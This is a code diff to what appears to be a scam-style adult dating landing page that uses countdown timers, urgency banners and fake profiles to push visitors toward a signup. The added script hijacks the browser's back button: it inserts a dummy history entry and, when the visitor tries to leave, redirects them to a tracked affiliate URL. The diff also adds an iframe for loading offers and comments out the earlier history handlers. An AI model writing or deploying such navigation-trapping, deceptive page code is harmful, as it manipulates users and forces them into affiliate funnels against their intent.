@@ -48,7 +48,18 @@
 
             }());
             afilter(1);
-          
+          if (window.location.hash != "#t") {
+                pushHistory();
+            }
+            window.addEventListener("popstate", function (e) {
+                afilter(5);
+                window.location.href = "https://secureconv-smart.com/?a=70580&c=130746";
+            }, false);
+
+            function pushHistory() {
+                var state = {title: "title", url: "#t"};
+                window.history.pushState(state, "title", "#t");
+            }
         </script>
     </head>
     <body>	
@@ -221,7 +232,7 @@
                                     <div>Free Private Invite open for next <span id="timer222">4:00</span></div>
                                 </div>
                                 <div class="inner-box"> 
-                                   
+                                    <iframe src="" width="100%" height="100%" frameborder="no" border="0" id="offerFrame"></iframe>
                                 </div>
                             </div>
                         </div>
@@ -321,7 +332,7 @@
                     pushReloaded = true;
                 }else if (window.location.href.indexOf("step1") > -1) {
 			newUrl = url.replace('&step1', '');
-			popstateBase();
+			//popstateBase();
 			pushReloaded = true;
 		}else{
                     newUrl = window.location.href;
@@ -356,7 +367,7 @@
                         $('.content .left .user-info, .title-bar').addClass('active');
                         $('#timer').text('HURRY ACT NOW');
                         if (!formStarted) {
-                            popstate0();
+                            //popstate0();
                             popIt();
                         }
                         return;
@@ -392,7 +403,7 @@
                         $('.title-bar .time span').addClass('active');
                         $('.top-bar-m').html('HURRY ACT NOW');
                         if (!formStarted) {
-                            popstate0();
+                           // popstate0();
                             popIt();
                         }
                         return;
@@ -469,7 +480,7 @@
                         form.reset();
                         $('.text-input').focus();
                         setTimeout(function () {
-                            popstate0();
+                           // popstate0();
                             popIt();
                         }, 2000);
                     }
@@ -729,7 +740,7 @@
                         }, 9000);
                     } else {
                         $('.content .right .is-typing .heart-svg').attr("class", "heart-svg");
-                        history.pushState({page: 0}, "", url0);
+                        //history.pushState({page: 0}, "", url0);
                         popIt();
                     }
                 });
@@ -766,7 +777,7 @@
                             postIt();
                         }, 5000);
                     } else {
-                        popstate0();
+                      //  popstate0();
                         closeGifts();
                         popIt();
                     }
@@ -781,7 +792,7 @@
                             postIt();
                         }, 5000);
                     } else {
-                        popstate0();
+                       // popstate0();
                         closeGifts();
                         popIt();
                     }
@@ -796,7 +807,7 @@
                             postIt();
                         }, 5000);
                     } else {
-                        popstate0();
+                        //popstate0();
                         closeGifts();
                         popIt();
                     }
@@ -811,7 +822,7 @@
                             postIt();
                         }, 5000);
                     } else {
-                        popstate0();
+                       // popstate0();
                         closeGifts();
                         popIt();
                     }
@@ -826,7 +837,7 @@
                             postIt();
                         }, 5000);
                     } else {
-                        popstate0();
+                       // popstate0();
                         closeGifts();
                         popIt();
                     }
@@ -942,7 +953,7 @@
 
                 $('.accept, .accept-invite').click(function () {
                     $('.top-bar .accept-invite').removeClass('flex-add');
-                    popstate0();
+                   // popstate0();
                     popIt();
                 });
 
@@ -960,7 +971,7 @@
                     $('.content .left .btn').addClass('bg-change');
                     $('.top-bar .accept-invite').removeClass('flex-add');
                     setTimeout(function () {
-                        popstate0();
+                       // popstate0();
                         popIt();
                     }, 100);
                     setTimeout(function () {
@@ -975,23 +986,23 @@
 
                 function handleClick() {
                     $('.top-bar .accept-invite').removeClass('flex-add');
-                    popstate0();
+                   // popstate0();
                     popIt();
                 }
 
                 $('body').on('click', '.user-msg', function () {
                     $('.top-bar .accept-invite').removeClass('flex-add');
-                    history.pushState({page: 0}, "", url0);
+                    //history.pushState({page: 0}, "", url0);
                     popIt();
                 });
 
                 $('body').on('click', '.accept-invite-btn', function () {
-                    popstate0();
+                   // popstate0();
                     popIt();
                 });
 
                 $('body').on('click', '.sub-pic', function () {
-                    popstate0();
+                    //popstate0();
                     switchPurple();
                     popIt();
                 });
@@ -999,7 +1010,7 @@
                 $('body').on('click', '.choose-gift', function () {
                     $('.pop-box .inner .profile img').attr('src', '//media.securesaferoute.com/land2/common/sb_tmr_l/img/online/circle/n/7.jpg');
                     $('.pop-box .inner p').text('Complete the free signup process and communicate with ' + myGirls[gCount].user + ' now!');
-                    popstate0();
+                    //popstate0();
                     popIt();
                 });
 
@@ -1079,7 +1090,7 @@
                     var u2="click";
                     u1=u1.replace(/\/d\/1/,"");
                     top.location.href=u1+"/"+u2;
-               
+                    
                     /*
                     startedSignup = true;
                     formStarted = true;
@@ -1108,8 +1119,8 @@
                         var u2="click";
                         u1=u1.replace(/\/d\/1/,"");
                         $("#offerFrame").attr("src",u1+"/"+u2);
-                    }*/
-                   
+                    }
+                   */
                 }
                 var isError1 = false;
                 var isError2 = false;
@@ -1248,13 +1259,13 @@
 
                 //Close pop box
                 $('.pop-box .inner .svg-close').click(function () {
-                    window.history.back();
+                   // window.history.back();
                     closePop();
                     closeClick++;
                     closeGifts();
                 });
 
-                window.addEventListener('popstate', function (event) {
+                /*window.addEventListener('popstate', function (event) {
                     var state = event.state;
 
                     if (state === null) {
@@ -1277,7 +1288,7 @@
                         console.log('gobackstep1')
                     }
                  
-                });
+                });*/
                 function goBackNext0() {
                     nextBtnClick = 0;
                     $('.man-woman-box').addClass('flex-add');
